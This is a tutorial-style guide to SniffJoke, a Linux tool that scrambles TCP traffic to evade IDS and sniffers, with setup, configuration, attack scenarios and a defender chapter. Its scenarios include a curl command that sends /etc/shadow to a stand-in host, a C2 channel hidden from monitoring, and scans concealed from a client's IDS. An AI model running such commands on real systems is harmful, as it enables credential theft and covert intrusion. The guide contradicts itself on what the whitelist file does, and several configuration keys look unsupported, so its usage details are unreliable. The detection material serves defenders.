---
tool_name: "sniffjoke"
display_name: "SniffJoke"
mitre_tactic: "defense_evasion"
mitre_tactic_id: "TA0005"
mitre_subcategory: "av_evasion"
install_command: "sudo apt install sniffjoke"
version: "0.4.1"
github_repo: "https://github.com/vecna/sniffjoke"
kali_tools_page: "https://www.kali.org/tools/sniffjoke/"
difficulty_level: "intermediate"
requires_root: true
gui_available: false
tags: ["network-evasion", "traffic-manipulation", "ids-evasion", "anti-sniffing", "tcp-scrambler"]
related_tools: ["fragmentation", "socat", "proxychains"]
---

# SniffJoke

## Chapter 1: Introduction & Overview

### What is SniffJoke?

SniffJoke is a transparent TCP connection scrambler for Linux that manipulates network traffic to prevent passive wiretapping by IDS systems and network sniffers. It delays, modifies, and injects fake packets into TCP connections, making them impossible to be correctly reconstructed by passive analysis tools.

### History & Background

- **Created:** 2009 by vecna (Giovanni Pellerano)
- **Maintained:** Project is now abandonware (archived)
- **License:** GPL-3.0
- **Purpose:** Client-side network traffic obfuscation

SniffJoke was designed as a privacy tool that operates at the network layer, inserting legitimate-looking but useless packets into TCP streams. The tool exploits how TCP/IP implementations handle out-of-order, duplicated, and malformed packets.

### When to Use This Tool

- **Network evasion:** Prevent IDS/IPS from analyzing traffic
- **Anti-sniffing:** Make packet captures unreliable
- **Privacy protection:** Obscure communication content from network monitors
- **Red team operations:** Evade network-based detection during engagements

### Key Concepts

- **Packet Injection:** Adding fake packets to TCP streams
- **TCP Scrambling:** Manipulating TCP headers and payloads
- **Transparent Proxying:** Operating transparently between client and server
- **IDS Evasion:** Defeating signature-based and protocol-based analysis

### How SniffJoke Works

```
Client → [SniffJoke] → Network → [Target Server]
                  ↓
         Injects fake packets
         Delays real packets
         Modifies TCP options
```

SniffJoke sits between the client and the network, modifying all outgoing TCP traffic in real-time. The server receives valid data (SniffJoke reassembles correctly), but any passive observer sees garbage.

---

## Chapter 2: Installation & Setup

### System Requirements

- **OS:** Linux (kernel >= 2.6.19 with tun support)
- **RAM:** 256 MB minimum
- **Disk Space:** ~5 MB
- **Privileges:** Root (for iptables and tun device)
- **Network:** WiFi or Ethernet as default gateway

### Installation Methods

#### Method 1: APT (Recommended)

```bash
sudo apt update && sudo apt install sniffjoke
```

**Explanation:** Installs SniffJoke from Kali's repositories. May not be available in all Kali versions due to abandonware status.

#### Method 2: Compile from Source

```bash
# Install dependencies
sudo apt install cmake gcc iptables tcpdump

# Clone repository
git clone https://github.com/vecna/sniffjoke.git
cd sniffjoke

# Build
mkdir build && cd build
cmake ..
make

# Install
sudo make install
```

**Explanation:** Building from source ensures you have the latest version. CMake handles the build process.

### Post-Installation Configuration

#### Verify Installation

```bash
sniffjoke --help
sniffjokectl --help
```

**Explanation:** Confirms that both the daemon and control client are installed.

#### Check Installed Files

```bash
# Service binary
/usr/local/bin/sniffjoke

# Control client
/usr/local/bin/sniffjokectl

# Autotest script
/usr/local/bin/sniffjoke-autotest

# Configuration directory
/usr/local/var/sniffjoke/generic/
```

**Explanation:** Understanding the file layout helps with configuration and troubleshooting.

---

## Chapter 3: Basic Usage

### Initial Setup with Autotest

Before using SniffJoke, run the autotest for your network location:

```bash
sudo sniffjoke-autotest -l home_network
```

**Explanation:** The autotest probes your network's behavior (MTU, packet handling, fragmentation support) and creates a location profile. The profile name (`home_network`) identifies this specific network environment.

### Starting the Service

```bash
# Start SniffJoke with the location profile
sniffjoke --location home_network

# Or use the control interface
sniffjokectl --start
```

**Explanation:** SniffJoke requires the network profile created by autotest. The service runs as a daemon that intercepts TCP traffic.

### Basic Commands

```bash
# Check status
sniffjokectl --stat

# Stop the service
sniffjokectl --stop

# View configuration
sniffjokectl --help
```

**Explanation:** The control client communicates with the running SniffJoke daemon to manage operations.

### Understanding the Configuration Files

```
/usr/local/var/sniffjoke/generic/
├── ipblacklist.conf      # IPs to exclude from scrambling
├── ipwhitelist.conf      # IPs to include in scrambling
├── iptcp-options.conf    # TCP option manipulation rules
├── plugins-enabled.conf  # Active plugins
├── port-aggressivity.conf # Port-specific aggression levels
└── sniffjoke-service.conf # Main service configuration
```

**Explanation:** Each configuration file controls a different aspect of SniffJoke's behavior.

### Minimal Configuration Example

```bash
# Edit the main config
sudo nano /usr/local/var/sniffjoke/generic/sniffjoke-service.conf

# Set the network interface
interface = eth0

# Set the listening port
listen_port = 9999
```

**Explanation:** The minimum configuration requires specifying the network interface and a port for the transparent proxy.

---

## Chapter 4: Intermediate Usage

### Network Interface Configuration

#### Setting Up Transparent Proxying

```bash
# Redirect traffic through SniffJoke using iptables
sudo iptables -t nat -A OUTPUT -p tcp -j REDIRECT --to-ports 9999
```

**Explanation:** iptables redirects all outgoing TCP traffic through SniffJoke's transparent proxy port. This ensures all connections are processed.

#### Excluding Specific Traffic

```bash
# Don't scramble traffic to the local DNS server
echo "192.168.1.1" >> /usr/local/var/sniffjoke/generic/ipwhitelist.conf

# Don't scramble traffic to the VPN endpoint
echo "10.0.0.1" >> /usr/local/var/sniffjoke/generic/ipwhitelist.conf
```

**Explanation:** Whitelisted IPs bypass SniffJoke processing, which is essential for VPN, DNS, and other infrastructure traffic.

### Plugin System

SniffJoke uses plugins for different manipulation techniques:

#### Available Plugins

| Plugin | Function |
|--------|----------|
| `fake_close_fin` | Injects fake FIN packets to confuse reassembly |
| `fragmentation` | Fragments TCP segments |
| `segmentation` | Splits payloads across multiple segments |
| `ttl_focus` | Manipulates TTL values |

#### Enable/Disable Plugins

```bash
# Edit plugins configuration
sudo nano /usr/local/var/sniffjoke/generic/plugins-enabled.conf

# Enable a plugin
plugin.fake_close_fin = enabled

# Disable a plugin
plugin.fragmentation = disabled
```

**Explanation:** Different plugins provide different evasion techniques. Enable only those needed for your network environment.

### Port-Specific Aggression

```bash
# Edit port aggressivity
sudo nano /usr/local/var/sniffjoke/generic/port-aggressivity.conf

# More aggressive scrambling on HTTP (port 80)
port.80 = high

# Less aggressive on SSH (port 22) to avoid latency
port.22 = low
```

**Explanation:** Different services tolerate different levels of manipulation. HTTP can handle more aggression than SSH.

### Monitoring and Logging

```bash
# Check SniffJoke statistics
sniffjokectl --stat

# View plugin logs
cat /usr/local/var/sniffjoke/generic/plugin.fake_close_fin.log
cat /usr/local/var/sniffjoke/generic/plugin.fragmentation.log
cat /usr/local/var/sniffjoke/generic/plugin.segmentation.log
```

**Explanation:** Logs show which plugins are active and how many packets they're manipulating.

### Multiple Network Locations

```bash
# Create profiles for different networks
sudo sniffjoke-autotest -l office
sudo sniffjoke-autotest -l coffee_shop
sudo sniffjoke-autotest -l hotel_wifi

# Switch between profiles
sniffjoke --location office
sniffjoke --location coffee_shop
```

**Explanation:** Different networks have different behaviors (MTU, NAT, proxies). Separate profiles optimize evasion for each environment.

---

## Chapter 5: Advanced Usage

### Advanced Configuration

#### TCP Option Manipulation

```bash
# Edit TCP options
sudo nano /usr/local/var/sniffjoke/generic/iptcp-options.conf

# Manipulate TCP window size
tcp.window_size = randomize

# Modify TCP timestamps
tcp.timestamps = inject_fake

# Alter TCP options order
tcp.options_order = shuffle
```

**Explanation:** TCP option manipulation makes traffic analysis harder by changing header fields that IDS systems rely on.

#### IP Blacklisting

```bash
# Never scramble traffic to these IPs
echo "192.168.1.0/24" >> /usr/local/var/sniffjoke/generic/ipblacklist.conf
echo "10.0.0.0/8" >> /usr/local/var/sniffjoke/generic/ipblacklist.conf
```

**Explanation:** Blacklisting ensures internal traffic is not affected by SniffJoke's manipulation.

### Custom Plugin Development

SniffJoke supports custom plugins written as shared objects (.so files):

```c
// Example custom plugin skeleton
#include <sniffjoke/plugin.h>

int plugin_init(void) {
    // Initialize plugin
    return 0;
}

int plugin_process(struct packet *pkt) {
    // Manipulate packet
    return 0;
}

void plugin_cleanup(void) {
    // Cleanup
}
```

**Explanation:** Custom plugins can implement organization-specific evasion techniques.

### Integration with VPN

```bash
# Run SniffJoke inside a VPN tunnel
# 1. Start VPN
sudo openvpn --config client.ovpn

# 2. Configure SniffJoke for VPN interface
sudo nano /usr/local/var/sniffjoke/generic/sniffjoke-service.conf
interface = tun0

# 3. Whitelist VPN server
echo "10.8.0.1" >> /usr/local/var/sniffjoke/generic/ipwhitelist.conf

# 4. Start SniffJoke
sniffjoke --location vpn_network
```

**Explanation:** Running SniffJoke inside a VPN encrypts traffic at the VPN layer while Scrambling prevents analysis of the VPN tunnel itself.

### Performance Tuning

```bash
# Reduce CPU usage by limiting packet rate
sudo nano /usr/local/var/sniffjoke/generic/sniffjoke-service.conf
max_packets_per_second = 1000

# Reduce memory usage
plugin_buffer_size = 1024
```

**Explanation:** High packet rates consume significant CPU. Tuning prevents performance degradation on slower systems.

### Logging and Auditing

```bash
# Enable verbose logging
sniffjoke --location home_network --debug

# Export statistics
sniffjokectl --stat > /tmp/sniffjoke_stats.txt

# Monitor real-time
watch -n 1 sniffjokectl --stat
```

**Explanation:** Detailed logging helps identify issues and verify that manipulation is occurring as expected.

---

## Chapter 6: Real-World Scenarios

### Scenario 1: CTF Challenge

**Objective:** Exfiltrate data without IDS detection

**Steps:**

```bash
# 1. Run autotest for the network
sudo sniffjoke-autotest -l ctf_network

# 2. Start SniffJoke
sniffjoke --location ctf_network

# 3. Verify it's running
sniffjokectl --stat

# 4. Exfiltrate data through scrambled connection
curl -X POST http://target.example.com/data -d @/etc/shadow

# 5. Stop when done
sniffjokectl --stop
```

**Explanation:** SniffJoke scrambles the exfiltration traffic, preventing IDS from reconstructing the data.

### Scenario 2: Penetration Test

**Objective:** Perform network attack without triggering IDS alerts

**Steps:**

```bash
# 1. Create network profile
sudo sniffjoke-autotest -l client_network

# 2. Configure exclusions for internal infrastructure
echo "192.168.1.1" >> /usr/local/var/sniffjoke/generic/ipwhitelist.conf

# 3. Start with moderate aggressivity
sniffjoke --location client_network

# 4. Perform attack activities
nmap -sS 192.168.1.0/24  # Traffic will be scrambled
```

**Explanation:** SniffJoke makes it harder for the client's IDS to detect scanning and exploitation activities.

### Scenario 3: Privacy Protection

**Objective:** Prevent network monitoring on public WiFi

**Steps:**

```bash
# 1. Test the public WiFi network
sudo sniffjoke-autotest -l coffee_shop

# 2. Start SniffJoke
sniffjoke --location coffee_shop

# 3. Browse normally
# All TCP traffic is now scrambled for passive observers

# 4. Stop when leaving
sniffjokectl --stop
```

**Explanation:** Public WiFi operators and other users cannot sniff your traffic content.

### Scenario 4: Red Team Covert Channel

**Objective:** Establish C2 channel that evades network inspection

**Steps:**

```bash
# 1. Configure SniffJoke for the target network
sudo sniffjoke-autotest -l target_office

# 2. Whitelist C2 infrastructure
echo "c2.example.com" >> /usr/local/var/sniffjoke/generic/ipwhitelist.conf

# 3. Start SniffJoke
sniffjoke --location target_office

# 4. Establish C2 channel
# Network monitoring tools see scrambled traffic
```

**Explanation:** C2 traffic appears as garbage to network monitors while functioning correctly end-to-end.

---

## Chapter 7: Detection & Defense

### How Defenders Detect SniffJoke

#### Network Indicators

- **Unusual packet patterns:** Duplicate ACKs, out-of-order segments
- **TCP anomalies:** Invalid TCP options, abnormal window sizes
- **High packet rates:** Many small packets per connection

#### Host-Based Indicators

- **iptables rules:** NAT REDIRECT rules pointing to local ports
- **Running processes:** `sniffjoke` daemon in process list
- **Network configuration:** Transparent proxy setup

#### Detection Methods

```bash
# Check for SniffJoke processes
ps aux | grep sniffjoke

# Check iptables for redirect rules
sudo iptables -t nat -L -n | grep REDIRECT

# Analyze traffic for anomalies
tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0' -c 100
```

**Explanation:** Multiple detection vectors exist for identifying SniffJoke usage on a network.

### Mitigation Strategies

#### Network-Level Controls

1. **Deep packet inspection:** Modern DPI can detect manipulated TCP options
2. **Protocol compliance checking:** Flag non-standard TCP behavior
3. **Network segmentation:** Limit where Scrambled traffic can go
4. **Egress filtering:** Block unusual TCP patterns at network boundaries

#### Host-Level Controls

1. **Process monitoring:** Detect and alert on SniffJoke processes
2. **iptables monitoring:** Alert on NAT REDIRECT rules
3. **Network configuration auditing:** Detect transparent proxy setups
4. **File integrity monitoring:** Detect SniffJoke binary and config changes

### Blue Team Response

1. **Implement TCP validation** at network boundaries
2. **Monitor for iptables modifications** on endpoints
3. **Use active scanning** instead of passive sniffing for traffic analysis
4. **Deploy behavioral analytics** to detect manipulation patterns
5. **Alert on duplicate/out-of-order TCP segments** exceeding normal thresholds

---

## Chapter 8: Troubleshooting

### Common Errors

#### Error: "TUN device not available"

**Cause:** Kernel tun module not loaded

**Solution:**

```bash
sudo modprobe tun
# Or add to /etc/modules
echo "tun" | sudo tee -a /etc/modules
```

**Explanation:** SniffJoke requires the TUN/TAP kernel module for transparent proxying.

#### Error: "Permission denied"

**Cause:** Not running as root

**Solution:**

```bash
sudo sniffjoke --location home_network
```

**Explanation:** SniffJoke requires root privileges for iptables manipulation and network interface access.

#### Error: "Autotest failed"

**Cause:** Network connectivity issues or unreachable test endpoint

**Solution:**

```bash
# Check network connectivity first
ping 8.8.8.8
# Retry autotest
sudo sniffjoke-autotest -l home_network
```

**Explanation:** The autotest requires active network connectivity to probe network behavior.

#### Error: "Plugin failed to load"

**Cause:** Missing shared library or compilation error

**Solution:**

```bash
# Check plugin files
ls /usr/local/lib/sniffjoke/*.so

# Rebuild if compiled from source
cd sniffjoke/build && make clean && make
sudo make install
```

**Explanation:** Plugin files must be present and compatible with the installed SniffJoke version.

### Performance Issues

#### High CPU Usage

```bash
# Reduce aggressivity
sudo nano /usr/local/var/sniffjoke/generic/port-aggressivity.conf
# Set all ports to 'low'

# Disable heavy plugins
sudo nano /usr/local/var/sniffjoke/generic/plugins-enabled.conf
# Disable fragmentation plugin
```

**Explanation:** Some plugins consume significant CPU. Reducing aggressivity or disabling plugins improves performance.

#### Connection Failures

```bash
# Check whitelist/blacklist
cat /usr/local/var/sniffjoke/generic/ipwhitelist.conf
cat /usr/local/var/sniffjoke/generic/ipblacklist.conf

# Ensure target IPs are whitelisted if needed
# Check iptables rules
sudo iptables -t nat -L -n
```

**Explanation:** Incorrect IP lists can cause connection failures by scrambling traffic that shouldn't be affected.

### FAQ

**Q: Is SniffJoke still maintained?**
A: No. The project is abandonware. Use at your own risk and be aware of potential compatibility issues with modern kernels.

**Q: Does SniffJoke encrypt traffic?**
A: No. SniffJoke scrambles traffic to prevent passive analysis. It does not provide encryption. Use it alongside encryption (TLS, VPN) for full protection.

**Q: Can SniffJoke bypass active IDS/IPS?**
A: No. SniffJoke defeats passive sniffing and analysis. Active systems that reassemble traffic will see the real data.

**Q: What kernel versions are supported?**
A: Linux kernel >= 2.6.19 with tun support. Modern kernels may have compatibility issues.

**Q: Does SniffJoke work with UDP?**
A: No. SniffJoke only handles TCP connections.

---

## Resources

### Official Documentation

- [SniffJoke GitHub](https://github.com/vecna/sniffjoke)
- [SniffJoke Man Pages](http://www.delirandom.net/sniffjoke/)
- [SniffJoke Concepts](http://www.delirandom.net/sniffjoke/sniffjoke-how-does-work)

### Academic References

- [Insertion, Evasion, and Denial of Service on IDS](http://www.delirandom.net/sniffjoke/Insertion%20Evasion%20and%20denial%20of%20service%20on%20IDS.pdf)
- [Phrack: Insertion Attacks](http://www.phrack.org/issues.html?issue=54&id=10#article)

### Related Tools

- **fragment:** TCP fragmentation tool
- **socat:** Advanced relay tool
- **proxychains:** Proxy chaining
- **obfs4proxy:** Traffic obfuscation

### Practice Resources

- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
